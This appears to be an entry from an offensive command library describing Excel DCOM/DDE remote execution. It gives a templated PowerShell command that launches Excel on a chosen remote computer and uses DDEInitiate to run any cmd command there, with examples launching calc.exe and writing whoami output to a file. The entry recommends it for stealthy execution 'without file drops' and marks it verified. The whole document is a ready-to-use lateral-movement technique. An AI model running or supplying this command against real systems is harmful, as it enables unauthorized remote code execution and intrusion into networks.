---
type: command
executor: powershell
data: >-
  $excel =
  [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application",
  "$_TARGET_COMPUTER")); $excel.DisplayAlerts = $false;
  $excel.DDEInitiate("cmd", "/c $_COMMAND"); $excel.Quit()
output: null
platforms:
  - Windows
tags:
  - dcom
  - remote-execution
verified: true
validated: true
---

# Excel-DDE-Remote-Execution

## Command

```powershell
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$_TARGET_COMPUTER"))
$excel.DisplayAlerts = $false
$excel.DDEInitiate("cmd", "/c $_COMMAND")
$excel.Quit()
```

## Description

This PowerShell command remotely instantiates Excel via DCOM and uses Dynamic Data Exchange (DDE) to execute a system command on the target machine. Ideal for simple remote command execution without file drops.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_COMPUTER | NetBIOS or FQDN of the target system | Yes |
| $_COMMAND | Command to execute (e.g., 'calc.exe' or 'powershell -c ...') | Yes |

## Examples

### Basic Usage

```powershell
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "TARGET-PC"))
$excel.DisplayAlerts = $false
$excel.DDEInitiate("cmd", "/c calc.exe")
$excel.Quit()
```

### Advanced Usage

```powershell
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "TARGET-PC"))
$excel.DisplayAlerts = $false
$excel.DDEInitiate("cmd", "/c whoami > C:\temp\output.txt")
$excel.Quit()
```

## Expected Output

No direct output from PowerShell; success is confirmed by the command running on the target (e.g., calculator appears or file is created). Errors indicate DCOM access denial or Office absence.

## Related

- [[procedures/DCOM-Office-Remote-Code-Execution]]
- [[commands/Visio-Remote-Execution]]
